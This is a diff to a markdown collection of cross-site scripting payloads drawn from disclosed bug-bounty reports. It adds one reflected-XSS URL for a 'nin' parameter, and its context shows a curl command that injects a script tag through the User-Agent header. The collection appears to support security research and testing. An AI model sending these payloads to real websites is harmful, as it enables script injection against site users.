@@ -1,6 +1,6 @@
 # Cross-site Scripting
 
-803 payloads from disclosed reports.
+804 payloads from disclosed reports.
 
 ## Reflected XSS via javascript: URI in referer parameter
 
@@ -970,6 +970,15 @@ curl "http://localhost:3000" -H 'User-Agent: <script>alert("XSS")</script>' > po
 
 **Parameter:** `User-Agent`
 — [XSS in express-useragent through HTTP User-Agent](https://hackerone.com/reports/362702) · Node.js third-party modules · [b9b86c2fc8409c628fb3de6](https://hackerone.com/b9b86c2fc8409c628fb3de6)
+
+### `113bdbfb`
+
+```
+https://target.com/nin/success?message=lol&nin=<script
+```
+
+**Parameter:** `nin`
+— [Reflected XSS in https://target.com/nin/success?message=lol&nin=<VULNERABLE>](https://hackerone.com/reports/2039384) · MTN Group · [hazemhussien99](https://hackerone.com/hazemhussien99)
 
 
 ## HTML attribute injection XSS using onerror handler
